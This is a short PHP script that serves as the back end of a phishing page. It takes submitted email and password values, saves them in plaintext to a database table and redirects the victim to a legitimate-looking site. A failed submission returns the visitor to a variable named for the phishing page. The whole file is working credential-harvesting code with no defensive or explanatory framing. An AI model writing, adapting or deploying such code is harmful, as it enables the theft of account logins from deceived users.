<?php

include('config.php');

$email = strstr($_POST['email'], '@') && strstr($_POST['email'], '.') ? htmlspecialchars($_POST['email']) : null;
$pass = $_POST['pass'] != '' && $_POST['pass'] != null ? htmlspecialchars($_POST['pass']) : null;

if ($email != null && $pass != null)
{
	mysql_query("INSERT INTO `$table` (`id`, `email`, `pass`) VALUES ('', '$email', '$pass');");
	die(header("Location: $direct_url"));
}

die(header("Location: $phisher_url"));

?>
